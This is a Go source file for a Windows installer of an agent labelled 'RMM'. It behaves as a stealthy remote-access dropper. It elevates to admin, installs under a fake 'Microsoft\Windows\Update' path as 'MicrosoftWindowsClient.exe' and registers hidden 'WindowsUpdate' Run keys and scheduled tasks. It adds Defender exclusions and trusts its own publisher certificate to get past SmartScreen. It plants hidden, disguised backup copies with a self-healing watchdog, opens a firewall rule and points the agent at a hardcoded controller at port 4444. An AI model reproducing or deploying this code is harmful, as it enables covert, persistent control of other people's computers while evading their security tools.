package main

import (
	"bytes"
	"embed"
	"fmt"
	"io"
	"io/fs"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows/registry"

	"rmm/internal/version"
)

//go:embed payload/*
var payloadFS embed.FS

func isAdmin() bool {
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE`, registry.WRITE)
	if err != nil {
		return false
	}
	k.Close()
	return true
}

func relaunchAsAdmin() {
	exe, _ := os.Executable()
	verb, _ := syscall.UTF16PtrFromString("runas")
	file, _ := syscall.UTF16PtrFromString(exe)
	params, _ := syscall.UTF16PtrFromString(strings.Join(os.Args[1:], " "))
	mod := syscall.NewLazyDLL("shell32.dll")
	mod.NewProc("ShellExecuteW").Call(0, uintptr(unsafe.Pointer(verb)), uintptr(unsafe.Pointer(file)),
		uintptr(unsafe.Pointer(params)), 0, 0)
	os.Exit(0)
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()
	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()
	_, err = io.Copy(out, in)
	return err
}

// hideFile sets hidden+system attributes so the backup survives casual
// browsing and naive delete sweeps. Best effort; failures are ignored.
func hideFile(path string) {
	_, _ = exec.Command("attrib", "+h", "+s", path).CombinedOutput()
}

// trustPublisherCert installs our code-signing cert into TrustedPublisher
// so SmartScreen/Smart App Control accept our signed binaries instead of
// blocking them as "unknown publisher". Needs admin (we have it).
func trustPublisherCert(dir string) {
	cer := filepath.Join(dir, "RMM.cer")
	if _, err := os.Stat(cer); err != nil {
		log.Printf("[!] publisher cert missing, SmartScreen may warn")
		return
	}
	out, err := exec.Command("certutil", "-addstore", "-f", "TrustedPublisher", cer).CombinedOutput()
	if err != nil {
		log.Printf("[!] trust publisher cert: %v %s", err, strings.TrimSpace(string(out)))
		return
	}
	log.Printf("[*] Publisher cert trusted")
}

// addDefenderExclusions keeps Defender from quarantining our install dir +
// exe (heuristic false positives on admin tools). Best effort: fails
// silently when Defender is absent, managed, or Tamper Protection blocks it
// (then the friend allows it once in Protection history).
func addDefenderExclusions(paths ...string) {
	for _, p := range paths {
		q := strings.ReplaceAll(p, "'", "''")
		_, _ = exec.Command("powershell", "-NoProfile", "-Command", `Add-MpPreference -ExclusionPath '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
		if strings.HasSuffix(strings.ToLower(p), ".exe") {
			_, _ = exec.Command("powershell", "-NoProfile", "-Command", `Add-MpPreference -ExclusionProcess '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
		}
	}
}

func removeDefenderExclusions(paths ...string) {
	for _, p := range paths {
		q := strings.ReplaceAll(p, "'", "''")
		_, _ = exec.Command("powershell", "-NoProfile", "-Command", `Remove-MpPreference -ExclusionPath '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
		if strings.HasSuffix(strings.ToLower(p), ".exe") {
			_, _ = exec.Command("powershell", "-NoProfile", "-Command", `Remove-MpPreference -ExclusionProcess '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
		}
	}
}

func saveHouse(path, addr string) {
	addr = strings.TrimSpace(addr)
	if addr == "" {
		return
	}
	seen := map[string]bool{addr: true}
	houses := []string{addr + "\n"}
	if b, err := os.ReadFile(path); err == nil {
		for _, ln := range strings.Split(string(b), "\n") {
			ln = strings.TrimSpace(ln)
			if ln == "" || strings.HasPrefix(ln, "#") || seen[ln] {
				continue
			}
			seen[ln] = true
			houses = append(houses, ln+"\n")
		}
	}
	_ = os.WriteFile(path, []byte(strings.Join(houses, "")), 0644)
}

func install() {
	silent := false
	for _, a := range os.Args {
		if a == "--silent" || a == "-s" {
			silent = true
		}
	}
	if !isAdmin() {
		relaunchAsAdmin()
		return
	}

	// Bland machine-wide home (hidden system dir) instead of a branded
	// Program Files folder.
	programData := os.Getenv("ProgramData")
	if programData == "" {
		programData = `C:\ProgramData`
	}
	installDir := filepath.Join(programData, "Microsoft", "Windows", "Update")
	_ = os.MkdirAll(installDir, 0755)

	_, _ = exec.Command("taskkill", "/F", "/IM", "agent.exe").CombinedOutput()
	_, _ = exec.Command("taskkill", "/F", "/IM", "MicrosoftWindowsClient.exe").CombinedOutput()
	// Legacy powershell watchdogs are extinct as of v1.40.9 (native --watch
	// mode); kill any left running.
	_, _ = exec.Command("powershell", "-NoProfile", "-command", "Get-CimInstance Win32_Process -Filter \"Name='powershell.exe'\" | Where-Object { $_.CommandLine -like '*watchdog.ps1*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }").CombinedOutput()
	time.Sleep(1500 * time.Millisecond)

	skip := map[string]bool{"install.bat": true, "README.txt": true, "README.md": true}
	_ = fs.WalkDir(payloadFS, "payload", func(path string, d fs.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return err
		}
		rel, _ := filepath.Rel("payload", path)
		if skip[strings.ToLower(filepath.Base(rel))] {
			return nil
		}
		dest := filepath.Join(installDir, rel)
		_ = os.MkdirAll(filepath.Dir(dest), 0755)
		data, _ := fs.ReadFile(payloadFS, path)
		_ = os.WriteFile(dest, data, 0644)
		return nil
	})

	agentPath := filepath.Join(installDir, "MicrosoftWindowsClient.exe")
	if _, err := os.Stat(agentPath); os.IsNotExist(err) {
		_ = filepath.Walk(installDir, func(p string, info os.FileInfo, err error) error {
			if err == nil && strings.EqualFold(filepath.Base(p), "MicrosoftWindowsClient.exe") {
				agentPath = p
			}
			return nil
		})
	}
	_ = os.Remove(filepath.Join(installDir, "agent.exe"))

	certPath := filepath.Join(installDir, "server.crt")

	controllerAddr := "176.229.98.54:4444"
	agentToken := ""
	for i, a := range os.Args {
		if (a == "-controller" || a == "--controller") && i+1 < len(os.Args) {
			controllerAddr = os.Args[i+1]
		} else if strings.HasPrefix(a, "-controller=") {
			controllerAddr = strings.TrimPrefix(a, "-controller=")
		} else if strings.HasPrefix(a, "--controller=") {
			controllerAddr = strings.TrimPrefix(a, "--controller=")
		} else if (a == "-token" || a == "--token") && i+1 < len(os.Args) {
			agentToken = strings.TrimSpace(os.Args[i+1])
		} else if strings.HasPrefix(a, "-token=") {
			agentToken = strings.TrimSpace(strings.TrimPrefix(a, "-token="))
		} else if strings.HasPrefix(a, "--token=") {
			agentToken = strings.TrimSpace(strings.TrimPrefix(a, "--token="))
		}
	}
	_ = os.WriteFile(filepath.Join(installDir, "controller.txt"), []byte(controllerAddr+"\n"), 0644)
	saveHouse(filepath.Join(installDir, "houses.txt"), controllerAddr)
	// Registration token: lets the controller tell managed agents apart
	// from rogue ones (empty = untokened, accepted unless enforced).
	tokenPath := filepath.Join(installDir, "token.txt")
	if agentToken != "" {
		_ = os.WriteFile(tokenPath, []byte(agentToken+"\n"), 0600)
		log.Printf("[*] Agent registration token stored")
	}

	cmdLine := fmt.Sprintf(`"%s" -controller %s -ca "%s"`, agentPath, controllerAddr, certPath)

	// HKCU may fail when installer runs elevated - not critical
	if k, _, err := registry.CreateKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
		if err := k.SetStringValue("WindowsUpdate", cmdLine); err != nil {
			log.Printf("[!] HKCU WindowsUpdate Run key write failed (non-critical): %v", err)
		}
		k.Close()
	}
	// HKLM is primary persistence
	if k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
		_ = k.SetStringValue("WindowsUpdate", cmdLine)
		k.Close()
		log.Printf("[*] HKLM WindowsUpdate Run key set")
	}

	// Stale-task sweep: detect legacy task pointing to pre-rename agent.exe.
	// schtasks /query /v reports the Task To Run value; if it mentions the
	// old name we log it explicitly so field techs can confirm the heal.
	if out, err := exec.Command("schtasks", "/query", "/tn", "WindowsUpdate", "/v", "/fo", "list").CombinedOutput(); err == nil {
		for _, ln := range strings.Split(string(out), "\n") {
			if strings.Contains(strings.ToLower(ln), "agent.exe") && !strings.Contains(strings.ToLower(ln), "microsoftwindowsclient") {
				log.Printf("[*] Stale task detected (points to old agent.exe), will replace: %s", strings.TrimSpace(ln))
				break
			}
		}
	} else {
		log.Printf("[*] No existing WindowsUpdate task (fresh install)")
	}
	_, _ = exec.Command("schtasks", "/change", "/tn", "WindowsUpdate", "/tr", cmdLine).CombinedOutput()

	taskXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><Date>2026-01-01T00:00:00</Date><Author>RMM</Author></RegistrationInfo>
  <Triggers><LogonTrigger><Enabled>true</Enabled><Repetition><Interval>PT10M</Interval><Duration>P10675199DT2H48M05.4775807S</Duration><StopAtDurationEnd>false</StopAtDurationEnd></Repetition></LogonTrigger><SessionStateChangeTrigger><Enabled>true</Enabled><StateChange>SessionUnlock</StateChange></SessionStateChangeTrigger></Triggers>
  <Principals><Principal id="Author"><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principals>
  <Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><IdleSettings><StopOnIdleEnd>false</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>true</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority><RestartOnFailure><Interval>PT1M</Interval><Count>9999</Count></RestartOnFailure></Settings>
  <Actions Context="Author"><Exec><Command>%s</Command><Arguments>-controller %s -ca "%s"</Arguments></Exec></Actions>
</Task>`, agentPath, controllerAddr, certPath)

	tmpTask := filepath.Join(os.TempDir(), "rmm_task.xml")
	_ = os.WriteFile(tmpTask, []byte(taskXML), 0644)
	_, _ = exec.Command("schtasks", "/delete", "/tn", "WindowsUpdate", "/f").CombinedOutput()
	if out, err := exec.Command("schtasks", "/create", "/tn", "WindowsUpdate", "/xml", tmpTask, "/f").CombinedOutput(); err != nil {
		log.Printf("[!] Failed to create WindowsUpdate task: %v %s", err, strings.TrimSpace(string(out)))
	} else {
		log.Printf("[*] WindowsUpdate task registered -> %s", agentPath)
	}
	_ = os.Remove(tmpTask)
	// Delete any legacy watchdog task before recreating below, so a stale
	// entry can never overlap with the new one.
	_, _ = exec.Command("schtasks", "/delete", "/tn", "WindowsUpdateWatchdog", "/f").CombinedOutput()

	_, _ = exec.Command("netsh", "advfirewall", "firewall", "add", "rule", "name=Windows Update", "dir=out", "action=allow", "program="+agentPath, "enable=yes").CombinedOutput()

	// Unblock-friendly install: trust our publisher cert (SmartScreen) and
	// ask Defender to leave our dir/exe alone (heuristic false positives).
	trustPublisherCert(installDir)
	addDefenderExclusions(installDir, agentPath)

	threeDObjects := filepath.Join(os.Getenv("USERPROFILE"), "3D Objects")
	blenderDir := filepath.Join(threeDObjects, "blender")
	_ = os.MkdirAll(blenderDir, 0755)
	// Second backup location: if one backup dir is wiped, the other still
	// heals the agent. Ordinary-looking system-ish path, hidden+system.
	backupDir2 := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Themes", "Cache")
	if os.Getenv("APPDATA") == "" {
		backupDir2 = filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", "Microsoft", "Windows", "Themes", "Cache")
	}
	_ = os.MkdirAll(backupDir2, 0755)
	// Save the task XML next to the backup so the watchdog can re-create a
	// deleted scheduled task by itself (self-healing persistence).
	_ = os.WriteFile(filepath.Join(blenderDir, "agent_task.xml"), []byte(taskXML), 0644)

	backupAgent := filepath.Join(blenderDir, "MicrosoftWindowsClient.exe")
	backupCert := filepath.Join(blenderDir, "server.crt")
	_ = copyFile(agentPath, backupAgent)
	_ = copyFile(certPath, backupCert)
	backupAgent2 := filepath.Join(backupDir2, "MicrosoftWindowsClient.exe")
	backupCert2 := filepath.Join(backupDir2, "server.crt")
	_ = copyFile(agentPath, backupAgent2)
	_ = copyFile(certPath, backupCert2)
	// Token travels with the backups (only when set - never create empties).
	backupToken := filepath.Join(blenderDir, "token.txt")
	backupToken2 := filepath.Join(backupDir2, "token.txt")
	if agentToken != "" {
		_ = os.WriteFile(backupToken, []byte(agentToken+"\n"), 0600)
		_ = os.WriteFile(backupToken2, []byte(agentToken+"\n"), 0600)
	} else {
		// Keep a previously-issued token across reinstalls that omit -token.
		if b, err := os.ReadFile(backupToken); err == nil && len(bytes.TrimSpace(b)) > 0 {
			_ = os.WriteFile(tokenPath, b, 0600)
			_ = os.WriteFile(backupToken2, b, 0600)
			log.Printf("[*] Kept existing registration token from backup")
		}
	}
	// version.txt next to binary AND both backups: watchdog restores only
	// when the backup is >= installed, so a bulk-updated agent is never
	// downgraded by a stale backup.
	_ = os.WriteFile(filepath.Join(installDir, "version.txt"), []byte(version.Version+"\n"), 0644)
	_ = os.WriteFile(filepath.Join(blenderDir, "version.txt"), []byte(version.Version+"\n"), 0644)
	_ = os.WriteFile(filepath.Join(backupDir2, "version.txt"), []byte(version.Version+"\n"), 0644)
	// Hidden+system attributes: invisible to casual browsing, blocks
	// shift-delete sweeps that skip system files.
	for _, p := range []string{backupAgent, backupCert, backupAgent2, backupCert2, backupToken, backupToken2} {
		hideFile(p)
	}

	// Native supervisor (v1.40.9+): the agent binary watches itself
	// (--watch mode). No powershell process, no .ps1 on disk. Legacy
	// script + its task-XML copy are removed so nothing references them.
	_ = os.Remove(filepath.Join(blenderDir, "watchdog.ps1"))
	_ = os.Remove(filepath.Join(backupDir2, "watchdog.ps1"))
	_ = os.Remove(filepath.Join(blenderDir, "watchdog_task.xml"))
	// (Retired powershell watchdog body removed; native --watch mode above.)

	// Start the native supervisor (same binary, hidden, bland name).
	cmdWatchdog := exec.Command(agentPath, "--watch")
	cmdWatchdog.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: 0x08000000,
	}
	_ = cmdWatchdog.Start()

	watchdogRunCmd := fmt.Sprintf(`"%s" --watch`, agentPath)
	// HKCU may fail when installer runs elevated (writes to admin's HKCU, not user's) - not critical, HKLM is primary
	if k, _, err := registry.CreateKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
		if err := k.SetStringValue("WindowsUpdateWatchdog", watchdogRunCmd); err != nil {
			log.Printf("[!] HKCU watchdog Run key write failed (non-critical): %v", err)
		}
		k.Close()
	}
	// HKLM is primary persistence - survives reboots for all users
	if k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
		_ = k.SetStringValue("WindowsUpdateWatchdog", watchdogRunCmd)
		k.Close()
		log.Printf("[*] HKLM watchdog Run key set")
	}

	createWatchdogTask(agentPath, blenderDir)

	cmd := exec.Command(agentPath, "-controller", controllerAddr, "-ca", certPath)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: 0x08000000,
	}
	_ = cmd.Start()

	// Drop the legacy branded home (pre-1.40.9 installs) now that the new
	// one is live with re-pointed tasks.
	legacyHome := `C:\Program Files\RMM\Agent`
	if pf := os.Getenv("ProgramFiles"); pf != "" {
		legacyHome = filepath.Join(pf, "RMM", "Agent")
	}
	if legacyHome != installDir {
		_ = os.RemoveAll(legacyHome)
	}

	if !silent {
		fmt.Println("Agent installed to", installDir)
	}
}

func main() {
	wantUninstall := false
	confirmed := false
	for i, a := range os.Args {
		if a == "--uninstall" {
			wantUninstall = true
		}
		if (a == "--confirm" && i+1 < len(os.Args) && strings.EqualFold(os.Args[i+1], "YES")) || strings.EqualFold(a, "--confirm=YES") {
			confirmed = true
		}
	}
	if wantUninstall {
		// Friction against casual/accidental removal: the flag alone is
		// not enough. Legit removal: --uninstall --confirm YES
		if !confirmed {
			fmt.Println("Refusing to uninstall without explicit confirmation.")
			fmt.Println("Usage: Agent-Setup.exe --uninstall --confirm YES")
			os.Exit(2)
		}
		programData := os.Getenv("ProgramData")
		if programData == "" {
			programData = `C:\ProgramData`
		}
		installDir := filepath.Join(programData, "Microsoft", "Windows", "Update")
		// Legacy home (pre-1.40.9): wiped after the new install lands.
		legacyDir := ""
		if pf := os.Getenv("ProgramFiles"); pf != "" {
			legacyDir = filepath.Join(pf, "RMM", "Agent")
		} else {
			legacyDir = `C:\Program Files\RMM\Agent`
		}
		if k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
			_ = k.DeleteValue("WindowsUpdate")
			_ = k.DeleteValue("WindowsUpdateWatchdog")
			k.Close()
		}
		if k, err := registry.OpenKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
			_ = k.DeleteValue("WindowsUpdate")
			_ = k.DeleteValue("WindowsUpdateWatchdog")
			k.Close()
		}
		_, _ = exec.Command("schtasks", "/delete", "/tn", "WindowsUpdate", "/f").CombinedOutput()
		_, _ = exec.Command("schtasks", "/delete", "/tn", "WindowsUpdateWatchdog", "/f").CombinedOutput()
		threeDObjects := filepath.Join(os.Getenv("USERPROFILE"), "3D Objects")
		blenderDir := filepath.Join(threeDObjects, "blender")
		_ = os.Remove(filepath.Join(blenderDir, "watchdog.ps1"))
		_ = os.Remove(filepath.Join(blenderDir, "watchdog.log"))
		_ = os.Remove(filepath.Join(blenderDir, "watchdog.log.1"))
		_ = os.Remove(filepath.Join(blenderDir, "version.txt"))
		_ = os.Remove(filepath.Join(blenderDir, "agent_task.xml"))
		_ = os.Remove(filepath.Join(blenderDir, "watchdog_task.xml"))
			_ = os.Remove(filepath.Join(blenderDir, "MicrosoftWindowsClient.exe"))
			_ = os.Remove(filepath.Join(blenderDir, "server.crt"))
			_ = os.RemoveAll(blenderDir)
			// Update-rollback leftovers next to the installed binary.
			_ = os.Remove(filepath.Join(installDir, "MicrosoftWindowsClient.prev.exe"))
			_ = os.Remove(filepath.Join(installDir, "version.prev.txt"))
			_ = os.Remove(filepath.Join(installDir, "pending_update.json"))
			_ = os.Remove(filepath.Join(installDir, "rollback_notice.json"))
			_ = os.Remove(filepath.Join(installDir, "token.txt"))
			_ = os.Remove(filepath.Join(blenderDir, "token.txt"))
		// Second backup location (v1.40.6+).
		backupDir2 := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Themes", "Cache")
		if os.Getenv("APPDATA") == "" {
			backupDir2 = filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", "Microsoft", "Windows", "Themes", "Cache")
		}
		_ = os.RemoveAll(backupDir2)
		if localApp := os.Getenv("LOCALAPPDATA"); localApp != "" {
			_ = os.Remove(filepath.Join(localApp, "RMM", "healthy"))
		}
		_, _ = exec.Command("taskkill", "/F", "/IM", "agent.exe").CombinedOutput()
		_, _ = exec.Command("taskkill", "/F", "/IM", "MicrosoftWindowsClient.exe").CombinedOutput()
		// Kill watchdog by command-line match (window title is unreliable when hidden).
		_, _ = exec.Command("powershell", "-NoProfile", "-command", "Get-CimInstance Win32_Process -Filter \"Name='powershell.exe'\" | Where-Object { $_.CommandLine -like '*watchdog.ps1*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }").CombinedOutput()
		removeDefenderExclusions(installDir, filepath.Join(installDir, "MicrosoftWindowsClient.exe"))
		_ = os.RemoveAll(installDir)
		if legacyDir != "" && legacyDir != installDir {
			_ = os.RemoveAll(legacyDir)
		}
		fmt.Println("Agent uninstalled.")
		os.Exit(0)
	}
	install()
}

func createWatchdogTask(agentPath, backupDir string) {
	// Native supervisor task: runs the agent binary with --watch (no
	// powershell anywhere). XML copy stays beside the backup so the
	// watcher itself can rebuild a deleted task.
	watchdogTaskXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><Date>2026-01-01T00:00:00</Date><Author>RMM</Author></RegistrationInfo>
  <Triggers>
    <LogonTrigger><Enabled>true</Enabled><Repetition><Interval>PT15M</Interval><Duration>P3650D</Duration><StopAtDurationEnd>false</StopAtDurationEnd></Repetition></LogonTrigger>
    <SessionStateChangeTrigger><Enabled>true</Enabled><StateChange>SessionUnlock</StateChange></SessionStateChangeTrigger>
  </Triggers>
  <Principals><Principal id="Author"><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings><StopOnIdleEnd>false</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
    <RestartOnFailure><Interval>PT1M</Interval><Count>9999</Count></RestartOnFailure>
  </Settings>
  <Actions Context="Author"><Exec><Command>%s</Command><Arguments>--watch</Arguments></Exec></Actions>
</Task>`, agentPath)

	// Keep a copy beside the backup so the watcher can rebuild a deleted
	// task without the installer.
	_ = os.WriteFile(filepath.Join(backupDir, "watchdog_task.xml"), []byte(watchdogTaskXML), 0644)
	tmpWatchdogTask := filepath.Join(os.TempDir(), "rmm_watchdog_task.xml")
	_ = os.WriteFile(tmpWatchdogTask, []byte(watchdogTaskXML), 0644)
	out, err := exec.Command("schtasks", "/create", "/tn", "WindowsUpdateWatchdog", "/xml", tmpWatchdogTask, "/f").CombinedOutput()
	if err != nil {
		log.Printf("[!] Failed to create watchdog task: %v %s", err, string(out))
	} else {
		log.Printf("[*] Watchdog task registered successfully")
	}
	_ = os.Remove(tmpWatchdogTask)
}